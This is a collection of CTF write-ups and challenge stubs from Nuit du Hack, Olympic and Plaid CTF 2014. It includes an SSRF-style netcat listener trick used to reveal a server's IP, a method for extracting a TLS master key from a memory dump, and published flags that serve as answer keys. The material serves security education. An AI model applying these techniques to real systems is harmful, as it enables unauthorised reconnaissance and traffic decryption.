Looking at `/var/www/blog/index.php` it’s obvious that the blog is powered by WordPress. I tried looking at `/var/www/blog/wp-config.php` and `/var/www/wp-config.php` but those files didn’t exist.

Most of the files in `/var/www/onion_rings` could be retrieved; others couldn’t because they were too large. [They’re in the `source` folder](source) if you’re curious, but note that these files were not helpful at all for getting the flag.

## Alternate approach

Another approach would be to enter a URL on a server under your control.

Start [Netcat](http://netcat.sourceforge.net/) or [Ncat](http://nmap.org/ncat) on your host to listen on port 80 (attention: your host should _not_ be behind NAT):

```bash
$ nc -vlp 80 # or use `netcat`
```

Then, on the Onion Rings website, enter the URL e.g. `http://your-host.example.com/1.jpg` and look for the IP of the Onion Rings server.

```
Ncat: Version 6.25 ( http://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 212.83.153.197.
Ncat: Connection from 212.83.153.197:54869.
GET /1.jpg HTTP/1.1
Host: your-host.example.com
Accept: */*
```

The IP address is clearly `212.83.153.197`. Visiting `http://212.83.153.197/` shows [the blog we’ve discussed before](blog.html), which contains the flag.

## Other write-ups

* <http://csrc.tamuc.edu/css/?p=116>
* <http://sigint.ru/nuitduhack2014/>

# Nuit du Hack CTF Qualifications: PsCrypto

**Category:** Crypto
**Points:** 250
**Description:**

> Here is a new cloud service named "PsCrypto™ ", it is used by many influental people. You can access your data with the login :"ulysse" and the password "penelope". The server adress is 54.217.202.218 and the port is 2609.
>
> A friend just gave you a file named "dump_users_ps.txt", in this file you have a small list of PsCrypto™ users.
>
> Your mission is to find the flag stored in a file of a specific user.
>
> [`pscrypto.tar.gz`](pscrypto.tar.gz)

## Write-up

(TODO)

## Other write-ups

* <http://blog.botbie.com/2014/04/06/nuit-du-hack-pscrypto-crypto250/>

# Nuit du Hack CTF Qualifications

* <http://quals.nuitduhack.com/>
* [Scoreboard](http://quals.nuitduhack.com/users)

## Completed write-ups

* [Here, kitty kitty!](here-kitty-kitty)
* [Nightly Auth](nightly-auth)
* [Onion Rings](onion-rings)

## Incomplete write-ups

* [Abitbol](abitbol)
* [Another One](another-one)
* [Big Momma](big-momma)
* [Carbonara](carbonara)
* [Data extraction](data-extraction)
* [GodMode](godmode)
* [Nibble](nibble)
* [PsCrypto](pscrypto)
* [The greatest](the-greatest)
* [Titanoreine](titanoreine)
* [Windows Forensics](windows-forensics)
* [Worthless](worthless)
* [Yutu](yutu)

# Nuit du Hack CTF Qualifications: The greatest

**Category:** Steganalysis
**Points:** 500
**Description:**

> We are sure that this e-mail contains hidden information, go get it!
>
> [`mail.tar`](mail.tar)

## Write-up

(TODO)

## Other write-ups

* <http://wiki.yobi.be/wiki/NDH_Writeups#The_greatest>

# Nuit du Hack CTF Qualifications: Titanoreine

**Category:** Web
**Points:** 300
**Description:**

> This week, a new image hosting website opened. The admin, afraid he might forget his access codes, created a file with credentials on the server. Your goal is to find the file to retrieve his password.
>
> <http://gallery.nuitduhack.com/>

## Write-up

(TODO)

The flag is `WhyAreHemorrhoidsNotCalledAssteroids`.

## Other write-ups

* <http://www.pwntester.com/blog/2014/04/06/nuitduhack-2014-web-write-ups/>

# Nuit du Hack CTF Qualifications: Windows Forensics

**Category:** Forensics
**Points:** 200
**Description:**

> On a client computer of a merchandise transport company, an employee realized that a command prompt containing commands appeared on the screen. The company contacted NianSec, a computer security company to assess the risk. John, trainee, was tasked to retrieve the memory of the windows system. By mistake, he only extracted the pagefile of the system before turning off the machine. You must retrace the attack and understand what happened on the machine.
>
> [`pagefile.sys.7z`](pagefile.sys.7z)

## Write-up

(TODO)

## Other write-ups

* <http://sigint.ru/nuitduhack2014/>

# Nuit du Hack CTF Qualifications: Worthless

**Category:** Crypto
**Points:** 50
**Description:**

> Hi,
>
> We just received an encrypted message from a weird man. None of our NSA agents know what it is. You have to find the decyphered message.
>
> [`Worthless.txt`](Worthless.txt)

## Write-up

(TODO)

## Other write-ups

* <http://www.pwntester.com/blog/2014/04/06/nuitduhack-2014-crypto-write-ups/>

# Nuit du Hack CTF Qualifications: Yutu

**Category:** Web
**Points:** 400
**Description:**

> Yutu, a chinese robot, is on again. You must use the ultra secure website of Yutu to recover classified data.
>
> <http://54.217.202.218:4242/>

## Write-up

(TODO)

## Other write-ups

* none yet

# Olympic CTF 2014: 20Lines

**Category:** Nopsleigh (Pwn)
**Points:** 500
**Author:** vos
**Description:**

> [Twenty Lines of Buttpain](20lines.c).
>
> ```bash
> nc 109.233.61.11 2020
> ```
>
> _Flag format: `CTF{..32 hexes..}`_
>
> Hint: [The exact binary running on the server](easy.bin)

## Write-up

(TODO)

## Other write-ups

* none yet

# Olympic CTF 2014: As seen on DEFCON

**Category:** Nopsleigh (Pwn)
**Points:** 10
**Author:** snk
**Description:**

> `EBFE` is to x86 as **____** is to ARM64.

## Write-up

This is a reference to [DEF CON 2006’s trivia challenge](http://nopsr.us/ctf2006prequal/walk-trivia.html#500) which went like this:

> `EBFE` is to x86 as **____** is to PowerPC.

This time we have to find the ARM64 equivalent. Let’s see what kind of instruction `EBFE` is:

```bash
$ echo -ne '\xEB\xFE' | ndisasm -
00000000  EBFE              jmp short 0x0
```

Okay, so `\xEB\xFE` is a `jmp` instruction. ARM doesn’t have `jmp` instructions though — [it uses `b` instructions (branches) instead](http://www.heyrick.co.uk/armwiki/B). Let’s see which opcode `b` maps to:

```bash
$ echo 'b .' | aarch64-linux-gnu-as
$ aarch64-linux-gnu-objdump -d a.out

a.out:     file format elf64-littleaarch64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   14000000        b       0 <.text>
```

So the 32-bit instruction word for `b` is `0x14000000`. Since ARM64 is little-endian, this becomes `00000014`.

The answer is `00000014`.

## Other write-ups

* none yet

# Olympic CTF 2014: Aski

**Category:** Binathlon (Bin)
**Points:** 300
**Author:** pzbitskiy
**Description:**

> Download: [`aski`](aski)
>
> HINT1: Check 10 + 25*i
>
> HINT2: pzbitskiy@aski:~$ cat /etc/issue
>
> Ubuntu 13.04 \n \l

## Write-up

(TODO)

The flag is `CTF+WINT3R+S3A50N`.

## Other write-ups

* <http://ctfcrew.org/writeup/25>

# Olympic CTF 2014: Crypting

**Category:** Figure Crypting (Crypto)
**Points:** 10
**Author:** touzoku
**Description:**

> 43wdxz 4edcvgt5 65rdcvb 6tfcgh8uhb 9ijn

## Write-up

The given ciphertext is a keyboard map. The shape of each group of characters on a US QWERTY keyboard spells out a single letter.

* `43wdxz` → `S`
* `4edcvgt5` → `O`
* `65rdcvb` → `C`
* `6tfcgh8uhb` → `H`
* `9ijn` → `I`

The flag is ‘sochi’.

## Other write-ups

* none yet

# Olympic CTF 2014: Echof

**Category:** Nopsleigh (Pwn)
**Points:** 300
**Author:** hellman
**Description:**

> pwn this. FILE: [task](task)
>
> ```bash
> nc 109.233.61.11 3129
> ```
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

## Other write-ups

* <http://balidani.blogspot.hu/2014/02/olympic-ctf-pwn300-echof-writeup.html>

# Olympic CTF 2014: Elf Quest 2

**Category:** Binathlon (Bin)
**Points:** 200
**Author:** hellman
**Description:**

> Tribute to Leet More 2010’s Elf Quest. Hope you are good at guessi… err, reversing! [`elfquest2`](elfquest2)
>
> HINT1: there are 3 stages
>
> HINT2: You need only first 20902 bytes of 32000
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{bf7475cb1733885d35b60e13bc2d7b8f}`.

## Other write-ups

* <http://tasteless.se/2014/02/olympic-ctf-sochi-2014-elf-quest-2-writeup/>

# Olympic CTF 2014: Emdee

**Category:** CURLing (Web)
**Points:** 300
**Author:** vos
**Description:**

> [md5<sup>-1</sup>("40288d60073775070a7edcdcd1df9c56") = ?](http://109.233.61.11:34380/)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.pwntester.com/blog/2014/02/09/olympicctf-curling-tasks/>
* [Source (released after the CTF)](source.php)

# Olympic CTF 2014: Find da Key

**Category:** Freestyle (Misc.)
**Points:** 200
**Author:** vos
**Description:**

> Task is very unusual: find the key. [`stego.txt`](stego.txt)

## Write-up

(TODO)

The flag is `Base_sixty_four_point_five`.

## Other write-ups

* <http://delimitry.blogspot.com/2014/02/olympic-ctf-2014-find-da-key-writeup.html>
* <http://sakura.pri-vate.net/tmp/writeup-olympicCTF2014-Free200.txt>

# Olympic CTF 2014: GuessGame

**Category:** Figure Crypting (Crypto)
**Points:** 300
**Author:** hellman
**Description:**

> Be careful, it’s cheating!
>
> ```bash
> nc 109.233.61.11 3126
> ```
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

## Other write-ups

* <http://mslc.ctf.su/wp/olympic-ctf-2014-guessgame-300/>
* <http://pastebin.com/1CGaPkTm>

# Olympic CTF 2014: HackMe

**Category:** Binathlon (Bin)
**Points:** 400
**Author:** psb
**Description:**

> Back to the 90th, [HackMe.tap](HackMe.tap).
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{A394F49FA76CC8D09AA2C7770F5FFEAE}`.

## Other write-ups and resources

* <http://www.0xebfe.net/blog/2014/02/09/olympicctf-binathlon-400-writeup/>
* <https://www.youtube.com/watch?v=XWozhb1ZOyM>

# Olympic CTF 2014: HFMS

**Category:** CURLing (Web)
**Points:** 500
**Author:** kyprizel, tracer.tong
**Description:**

> We found some [hockey field management system](http://109.233.61.11:11180/). Get the flag?
>
> _Flag format: `CTF{..32 hexes..}`_
>
> HINT1: are there any other users than "admin"?
>
> HINT2: use Burp Suite to get inside
>
> Start with username: debug

## Write-up

(TODO)

## Other write-ups

* <http://www.pwntester.com/blog/2014/02/14/olympic-ctf-curling500-write-up/>

# Olympic CTF 2014: Illegal Radio

**Category:** Freestyle (Misc.)
**Points:** 300
**Author:** psb
**Description:**

> We found illegal radio transmissions and saved them into [dump](OLYMPIC-CTF.FM - 133.37MHz - IQ_Data.flac) for you. Please check it for data leakage.
>
> _Flag format: `CTF{..32 hexes..}`_
>
> HINT1: [https://dl.dropboxusercontent.com/u/45174825/olympics.png](olympics.png)
>
> HINT2: You know that it’s FM radio transmission / IQ data dump.

## Write-up

(TODO)

## Other write-ups

* <http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-illegal-radio.html>

# Olympic CTF 2014: Just No One

**Category:** Binathlon (Bin)
**Points:** 10
**Author:** vos
**Description:**

> Here’s your binary: [`setup.exe`](setup.exe)

## Write-up

The provided `setup.exe` file is a standard installation wizard.

![](setup-1.png)

As usual with these wizards, the second screen contains a very long license agreement that must be accepted before continuing the installation.

![](setup-2.png)

The next screen prompts for a password. Which password? Hmm… It’s possible to [crack it](http://maroueneboubakri.blogspot.com/2014/02/olympic-ctf-sochi-2014-binathlon-10.html) and then proceed with the installation, but that doesn’t really help, because when the executable is opened, it just repeats “You already saw the flag.”:

![You already saw the flag.](executable.png)

And indeed — after running `setup.exe` again and carefully reading the license agreement this time, we notice something unusual:

![7A. YOU MAY SUBMIT THIS TO GET TEN POINTS: ILOVEREADINGEULAS.](setup-4.png)

The flag is `ILOVEREADINGEULAS`.

## Other write-ups

* <http://maroueneboubakri.blogspot.com/2014/02/olympic-ctf-sochi-2014-binathlon-10.html>
* <https://ctftime.org/writeup/926>

# Olympic CTF 2014: LHC

**Category:** Nopsleigh (Pwn)
**Points:** 400
**Author:** vos
**Description:**

> Gain access to 109.233.61.11:30483. As of our previous intrusion effort, we’ve got a previous version of the binary. Currently they are running a more advanced one, but hey - it’s better than nothing: [`lhc_old`](lhc_old).
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

## Other write-ups

* <http://geohot.com/lhcwriteup.html>

# Olympic CTF 2014: Make similar

**Category:** Freestyle (Misc.)
**Points:** 400
**Author:** psb
**Description:**

> [Listen](similar.ogg) carefully and try to figure out. Hint: 120 LPM
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

The “120 LPM” hint refers to [weather fax](http://en.wikipedia.org/wiki/Radiofax), an analog mode for transmitting monochrome images.

There’s an OS X application called [Multimode](http://www.blackcatsystems.com/software/multimode/fax.html#HOWREC) which can be used to convert the audio back into the original fax images. It only accepts WAV files as input though, so first I converted [`similar.ogg`](similar.ogg) to `similar.wav` using Audacity. The result looks something like this:

![](fax.jpg)

The text is the following:

```
section 1 of 1 of file rfax_man
begin 644 rfax_man
h5sg60BSxwp62+57aMLVTPK3i9b-t+5pGLKyPA-FxxuysvFs+BT8+o0dVsM24
hcZHRaWYEHRBGFGtqk-cMV7oqqQRzbobGRB9Kwc-pTHzCDSSMJorR8d-pxdqd
hLWpvQWRv-N33mFwEicqz+UFkDYsbDvrfOC7tko5g1JrrSX0swhn64neLsohr
h26K1mSxnS+TF1Cta8GHHQ-t1Cfp7nh-oZeFuVi5MEynqyzX8kMtXcAynSLQx
hg4o56Pu4YUZHMqDGtczKeCwXU8PZEc4lY0FbDfFfgZpJFC-a-sHGLtGJgCMZ
hksr6XNTedEUdVJqxOO5VaReoH68eEPJ2m6d9mKhlhVE7zw4Yru4DUWRCJH28
hyeth+l2I0gPnEfrTLwAc+-TPS0YKYY3K0np58gVPgdAN8RY7+rQfRDin9JSa
hPG32WG7-rTl3uthvrnDO-wD09GDIRCniuoefs8UsfiWZOLq+0awOrQxAPM+C
hxLwOJ9VUKwdn7dJduLn1KhBucvL1pr5lGiBFfUbL79cFFex+G27kT+fsQ7X5
h87mgPivWhDSQHKPXqpKGniDkYsIYpg66ZWbHp4PfcgtPukElDWENlQPSuNAQ
hnboE4Bd8kyyokt67GgfGvBVS45sMFPtlgKRlG-QPFSgbMHujA3qYemxnuqGx
hp97aXpdKpvAE8zx-oUzazoVFz32X3OxAuiWJhKEjaYKpM7f95yv1S62v+k++
+
end
sum —r/size 7468/769 section (from "begin" to "end")
sum —r/size 36513/540 entire input file
```

This looks like [xxencoded](http://en.wikipedia.org/wiki/Xxencoding) text. Let’s [decode it using an online xxdecoder](http://www.webutils.pl/XXencode). This results in a file named `rfax_man`. What could it be?

```bash
$ file rfax_man
rfax_man: gzip compressed data, was "rfax_man.py", from FAT filesystem (MS-DOS, OS/2, NT), last modified: Thu Feb  6 17:52:39 2014, max speed
```

It’s gzip-compressed data! Let’s find out what it is:

```bash
$ gunzip < rfax_man > rfax_man_unzipped
```

It seems `rfax_man_unzipped` is a Python script:

```python
import socket,os,sys,hashlib

KEY  = "CTF{4BDF4498E4922B88642D4915C528DA8F}" # DO NOT SHARE THIS!
HOST = '109.233.61.11'
PORT = 8001

if len(sys.argv)<3:
  print 'Usage: rfax_man.py add|del file.png'
  print '\nAdd your pictures to transmission!\nSizes: 800<=width<=3200 and height/width <= 2.0.\nUse contrast grayscale pictures.'
  sys.exit(0)

data=open(sys.argv[2],'rb').read(1000000)

m=hashlib.md5(); m.update(KEY); KEYH=m.hexdigest().upper()
m=hashlib.md5(); m.update(data); h=m.hexdigest().upper()
print 'File hash',h

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print 'Connected.'

if sys.argv[1]=='add':
  s.sendall(KEYH+':ADD:'+data)
  s.shutdown(socket.SHUT_WR)
  print s.recv(1024)
elif sys.argv[1]=='del':
  s.sendall(KEYH+':DEL:'+h)
  print s.recv(1024)

s.close()
print 'Done.'
```

That third line looks interesting. The key is `CTF{4BDF4498E4922B88642D4915C528DA8F}`.

## Other write-ups and resources

* <http://www.pwntester.com/blog/2014/02/10/olympic-ctf-freestyle-400-make-similar-write-up/>
* <https://isisblogs.poly.edu/2014/02/10/make-similiar-olympic-ctf-2014-writeup/>

# Olympic CTF 2014: mic

**Category:** Figure Crypting (Crypto)
**Points:** 200
**Author:** hellman
**Description:**

> Flags for free!
>
> ```bash
> nc 109.233.61.11 3120
> ```
>
> Service source code: [`mic_server.py`](mic_server.py)
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{cf5246e06b13432b9e1116ddef226455}`.

## Other write-ups

* <http://ctfcrew.org/writeup/22>

# Olympic CTF 2014: Out there

**Category:** CURLing (Web)
**Points:** 10
**Author:** kyprizel
**Description:**

> Flag is out there: <http://[2a02:6b8:0:141f:fea9:d5ff:fed5:XX01]/>
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{7a0dd6d4556a7ed60e6f7686eae0590d}`.

## Other write-ups

* <http://maroueneboubakri.blogspot.com/2014/02/olympic-ctf-sochi-2014-curling100.html>
* <https://ctftime.org/writeup/928>

# Olympic CTF 2014: PRITLSAMA

**Category:** Figure Crypting (Crypto)
**Points:** 400
**Author:** kyprizel
**Description:**

> Feel yourself a PRISM operator. [`session.pcap`](session.pcap) [`backbone.cap`](backbone.pcap)
>
> _Flag format: `CTF{..32 hexes..}`_
>
> Hint: Start with Ticket key ID and backbone offset
>
> Hint 2: PRITLSAMA has nothing to do with coverty channels
>
> Hint 3: TLS and Elliptic**s**

## Write-up

(TODO)

## Other write-ups

* none yet

# Olympic CTF 2014

* <https://olympic-ctf.ru/>
* [Scoreboard](https://olympic-ctf.ru/scoreboard)
* [Olympic CTF 2014 tasks and write-ups @ CTFTime.org](https://ctftime.org/event/130/tasks/)

## Completed write-ups

* [As seen on DEFCON](as-seen-on-defcon)
* [Crypting](crypting)
* [Just No One](just-no-one)
* [Make similar](make-similar)
* [Trivial](trivial)

## Incomplete write-ups

* [20lines](20lines)
* [Aski](aski)
* [Echof](echof)
* [Elf Quest 2](elf-quest-2)
* [Emdee](emdee)
* [Find da Key](find-da-key)
* [GuessGame](guessgame)
* [HackMe](hackme)
* [HFMS](hfms)
* [Illegal Radio](illegal-radio)
* [LHC](lhc)
* [mic](mic)
* [Out there](out-there)
* [PRITSLAMA](pritslama)
* [Remote Shellcoding Appliance](remote-shellcoding-appliance)
* [RPC](rpc)
* [Welcome to Forensics](welcome-to-forensics)
* [xnginx](xnginx)
* [zbin](zbin)
* [zpwn](zpwn)

# Olympic CTF 2014: Remote Shellcoding Appliance

**Category:** Figure Crypting (Crypto)
**Points:** 500
**Author:** hellman
**Description:**

> go pwn this.
>
> [`task.py`](task.py), [`exec.so`](exec.so)
>
> ```bash
> nc 109.233.61.11 3123
> ```
>
> Service source code: [`mic_server.py`](mic_server.py)
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

## Other write-ups

* none yet

# Olympic CTF 2014: RPC

**Category:** CURLing (Web)
**Points:** 400
**Author:** d0znpp
**Description:**

> [Wallarm](http://wallarm.com/) experts do it in 3 minutes. How long will [it take you](http://109.233.61.11:8880/)?
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{b15ffee30a117f418d1cede6faa57778}`.

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-rpc-400.html>
* <http://tasteless.se/2014/02/olympic-ctf-sochi-2014-rpc-writeup/>
* <http://www.pwntester.com/blog/2014/02/09/olympicctf-curling-tasks/>

# Olympic CTF 2014: Trivial

**Category:** Freestyle (Misc.)
**Points:** 10
**Author:** vos
**Description:**

> Hack the Planet_

## Write-up

At DEF CON CTF there’s a running gag where each year they have a challenge where the only description is “Hack the Planet!” with one character or word blanked out.

This is the same thing. In this case, the missing character is the `!` at the end, so the flag is `!`.

## Other write-ups and resources

* <https://www.youtube.com/watch?v=drJWxMLrpE0>

# Olympic CTF 2014: Welcome to Forensics

**Category:** Freestyle (Misc.)
**Points:** 500
**Author:** vos
**Description:**

> One of our admins, before his agonizing death by being squished by an elephpant, changed the passwords on all our servers! Postmortem autopsy found in his stomach a usb pen drive with sole file: [`WTF.BIN`](WTF.BIN), as well as high concentration of epinephprine in his blood. We need our servers!!
>
> **Hint:** File offset 17702

## Write-up

(TODO)

## Other write-ups

* <http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-welcome-to-forensics.html>
* <http://hardc0de.ctf.su/archives/102>

# Olympic CTF 2014: xnginx

**Category:** CURLing (Web)
**Points:** 200
**Author:** kyprizel
**Description:**

> [flag is there](http://109.233.61.11:27280/)
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{6e75d02b8e8329bb4b45c7dabd2e1da2}`.

## Other write-ups and resources

* <http://tasteless.se/2014/02/olympic-ctf-sochi-2014-xnginx-writeup/>
* <http://gebl.ctf.ir/2014/02/olympic-ctf-2014-web200/>
* <http://www.pwntester.com/blog/2014/02/09/olympicctf-curling-tasks/>
* Documentation for [the `X-Accel-Redirect` header](http://wiki.nginx.org/X-accel#X-Accel-Redirect)

# Olympic CTF 2014: zbin

**Category:** Binathlon (Bin)
**Points:** 500
**Author:** mephi42, pzbitskiy
**Description:**

> We know you’ll want to have another look.
> Download: [`zbin`](zbin)
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{6b30ce0743be6b6530ecbdb8c6c414bd}`.

## Other write-ups

* <http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-zbin-re-500.html>

# Olympic CTF 2014: zpwn

**Category:** Nopsleigh (Pwn)
**Points:** 200
**Author:** pzbitskiy
**Description:**

> zpwn it [zpwn](zpwn).
>
> ```bash
> nc -u 109.233.61.11 31337
> ```
>
> _Flag format: `CTF{..32 hexes..}`_
>
> Hint: [non-stripped zpwn](zpwn-no-strip)

## Write-up

(TODO)

The flag is `CTF{684eed23a11fd416bb56b809d491eef4}`.

## Other write-ups

* <http://blog.lse.epita.fr/articles/64-olympic-ctf-2014-zpwn-200-points.html>
* <http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-zpwn-200.html>
* <http://blog.divine-protection.com/2014/02/olympic-ctf-2014-zpwn-s390x-exploitation.html>

# Plaid CTF 2014: bbos

**Category:** Forensics
**Points:** 100
**Description:**

> You have traveled back in time, but look, hunting The Plague is tough. You're really just going back to relax for a while without having to worry about all that nonsense. As you walk in the park you stumble across someone's BlackBerry. Wow, people still use BlackBerry phones (time travel gets so confusing)? You figure you should return it to the owner, but you have a hard time getting inside. Figure out what's on [the phone](https://mega.co.nz/#!ulIEhCpQ!FlmQ9o4y_msfk3hUzqIw6vFGzrfVFWUQGqJRRJlrzfI), and maybe we'll be able to return it to the rightful owner.

## Write-up

(TODO)

## Other write-ups

* <https://fail0verflow.com/blog/2014/plaidctf2014-for350-bbos.html>
* <https://ctftime.org/writeup/1107>

# Plaid CTF 2014: bronies

**Category:** Web
**Points:** 500
**Description:**

> We are trying to break into eXtreme Secure Solutions, where The Plague works as a system adminstrator. We have found that their internal company login page is at <http://portal.essolutions.largestctf.com/>. Recon has also revealed that The Plague likes to browse this site during work hours: <http://54.196.225.30/> using the username `ponyboy2004`.
> Remember, our main target is to break into the company portal, *not* the pony site.
>
> UPDATE: The SQL injection was not intentional and does not help you solve the problem. We believe it has been fixed. If you have questions, please ask ricky on #pctf @ sendak.freenode.net.
> UPDATE2: Also, bronies is not intended to be solved via client side (e.g. WebKit) exploits - if you manage to do so though, that's fair game.
> UPDATE3: Bronies was broken until 2013-04-13 07:26:28 UTC (the admin wasn't logging onto the internal portal properly). Please retry your exploits.
> UPDATE4: Sorry, once again, please retry your bronies part 1 exploits. We think we fixed a bug at 2013-04-13 08:33:30 UTC that was breaking some attempts.
>
> Hint: just to clarify, both flags for bronies are behind the login page - the pony site doesn't have any flags in it.

## Write-up

(TODO)

The first flag is `xss_problem_is_web_problem`. The second flag is `WEB_you_hacked_the_bigson_WEB`.

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-web800-bronies.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/bronies)

# Plaid CTF 2014: curlcore

**Category:** Forensics
**Points:** 250
**Description:**

> We managed to grab a [memory dump](curlcore-b9b2bc016a796db9db66be6365d48a6b.tar.bz2) off of The Plague’s computer while he was making a secure download. We think he may have been looking for new places to hide the Prime Factorizer. Can you figure out what messages were sent through his computer?

## Write-up

Unzip [the provided tarball](curlcore-b9b2bc016a796db9db66be6365d48a6b.tar.bz2). This results in the following file/directory structure:

```bash
$ tree
.
├── curlcore.sh
├── lib
│   └── x86_64-linux-gnu
│       ├── ld-2.17.so
│       ├── libc-2.17.so
│       ├── libcom_err.so.2.1
│       ├── libcrypt-2.17.so
│       ├── libcrypto.so.1.0.0
│       ├── libdl-2.17.so
│       ├── libgcrypt.so.11.7.0
│       ├── libgpg-error.so.0.10.0
│       ├── libkeyutils.so.1.4
│       ├── libnsl-2.17.so
│       ├── libnss_compat-2.17.so
│       ├── libnss_files-2.17.so
│       ├── libnss_nis-2.17.so
│       ├── libpthread-2.17.so
│       ├── libresolv-2.17.so
│       ├── libssl.so.1.0.0
│       └── libz.so.1.2.8
├── tmp
│   ├── capture
│   ├── corefile
│   └── coremaps
└── usr
    ├── bin
    │   └── curl
    └── lib
        └── x86_64-linux-gnu
            ├── libasn1.so.8.0.0
            ├── libcurl.so.4.3.0
            ├── libgnutls.so.26.22.6
            ├── libgssapi.so.3.0.0
            ├── libgssapi_krb5.so.2.2
            ├── libhcrypto.so.4.1.0
            ├── libheimbase.so.1.0.0
            ├── libheimntlm.so.0.1.0
            ├── libhx509.so.5.0.0
            ├── libidn.so.11.6.11
            ├── libk5crypto.so.3.1
            ├── libkrb5.so.26.0.0
            ├── libkrb5.so.3.3
            ├── libkrb5support.so.0.1
            ├── liblber-2.4.so.2.8.3
            ├── libldap_r-2.4.so.2.8.3
            ├── libp11-kit.so.0.0.0
            ├── libroken.so.18.1.0
            ├── librtmp.so.0
            ├── libsasl2.so.2.0.25
            ├── libsqlite3.so.0.8.6
            ├── libtasn1.so.3.2.0
            └── libwind.so.0.0.0

7 directories, 45 files
```

`curlcore.sh` is a shell script that was used to create the tarball. It contains this piece of code:

```bash
sleep 1
OUTPUT="`/usr/bin/env -i /bin/dash -c 'ulimit -c unlimited; curl -k https://curlcore.local.plaidctf.com/flag.html & PID=$!; sleep 5; printf "generate-core-file\ninfo proc mappings\ndetach\n" | sudo gdb attach $PID; wait'`"
sleep 1
```

Apparently, `https://curlcore.local.plaidctf.com/flag.html` was requested while the dump was created. The flag we’re looking for is probably part of the response.

Open `tmp/capture` in Wireshark. It shows that `https://curlcore.local.plaidctf.com/flag.html` was indeed requested, but since it was downloaded over HTTPS the plain text response isn’t available as part of the capture. We _do_ know that `TLS_RSA_WITH_AES_256_CBC_SHA` is used, i.e. the data is encrypted with AES-256 and the key is exchanged using basic RSA encryption. Wireshark also displays the RSA session ID, `19AB5EDC02F097D5074890E44B483A49B083B043682993F046A55F265F11B5F4`:

![](wireshark-capture.png)

Now that we have the session ID, [we could decrypt the entire session if we also had the SSL master secret](http://www.cloudshield.com/blog/advanced-malware/how-to-decrypt-openssl-sessions-using-wireshark-and-ssl-session-identifiers/):

![Wireshark → Edit → Preferences → Protocols → SSL](wireshark-ssl-master-secret-log-format.png)

But where could we find this SSL master key? `curl` depends on OpenSSL for TLS support… So [let’s see how OpenSSL stores the SSL master key in memory](https://github.com/openssl/openssl/blob/300b9f0b704048f60776881f1d378c74d9c32fbd/ssl/ssl.h#L586-L590).

```h
struct ssl_session_st
  {
  // […]
  int master_key_length;
  unsigned char master_key[SSL_MAX_MASTER_KEY_LENGTH];
  /* session_id - valid? */
  unsigned int session_id_length;
  unsigned char session_id[SSL_MAX_SSL_SESSION_ID_LENGTH];
  // […]
}
```

Turns out the SSL master key is close to the session ID, in the same struct.

Let’s see if the session ID occurs in any of the other files:

```bash
$ grep '\x19\xAB\x5E\xDC\x02\xF0\x97\xD5\x07\x48\x90\xE4\x4B\x48\x3A\x49\xB0\x83\xB0\x43\x68\x29\x93\xF0\x46\xA5\x5F\x26\x5F\x11\xB5\xF4' -r .
Binary file ./tmp/capture matches
Binary file ./tmp/corefile matches
```

A-ha, `tmp/corefile` also contains the session ID. Let’s look near the session ID in this file, for anything that might be the SSL master key for the connection.

```bash
$ hexdump -C tmp/corefile | grep --before=5 --after=3 '19 ab 5e dc'
0004fbc0  20 20 00 00 00 00 00 00  70 01 00 00 00 00 00 00  |  ......p.......|
0004fbd0  01 03 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0004fbe0  30 00 00 00 19 1e 50 42  e6 b3 13 71 aa 65 25 8e  |0.....PB...q.e%.|
0004fbf0  13 b2 dc 71 4d 98 4d f8  d6 8f ad 67 8f f0 a2 fc  |...qM.M....g....|
0004fc00  49 47 6d 65 c3 a1 61 f7  18 57 2c 3f 5d b8 56 6a  |IGme..a..W,?].Vj|
0004fc10  0d e8 9e 58 20 00 00 00  19 ab 5e dc 02 f0 97 d5  |...X .....^.....|
0004fc20  07 48 90 e4 4b 48 3a 49  b0 83 b0 43 68 29 93 f0  |.H..KH:I...Ch)..|
0004fc30  46 a5 5f 26 5f 11 b5 f4  00 00 00 00 00 00 00 00  |F._&_...........|
0004fc40  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
```

And indeed: right before the session ID, starting with `19 1e 50 42` and ending with `0d e8 9e 58` there is something that might be a valid master key (consisting of exactly `96` hexadecimal digits).

Let’s write the session ID and this master key to [a file in the format described by Wireshark](session-master-secret.log):

```
RSA Session-ID:19AB5EDC02F097D5074890E44B483A49B083B043682993F046A55F265F11B5F4 Master-Key:191E5042E6B31371AA65258E13B2DC714D984DF8D68FAD678FF0A2FC49476D65C3A161F718572C3F5DB8566A0DE89E58
```

Go to Wireshark → Edit → Preferences → Protocols → SSL and select the `session-master-secret.log` file in the (Pre-)Master-Secret log filename input field.

After that, you can right-click on any TLS/SSL packet and select ‘Follow SSL Stream’ to view the decoded payload.

![](wireshark-flag.png)

The flag is `congratz_you_beat_openssl_as_a_whitebox`.

## Other write-ups and resources

* <https://cesena.ing2.unibo.it/2014/04/14/plaidctf-2014-curlcore-forensic-250/>
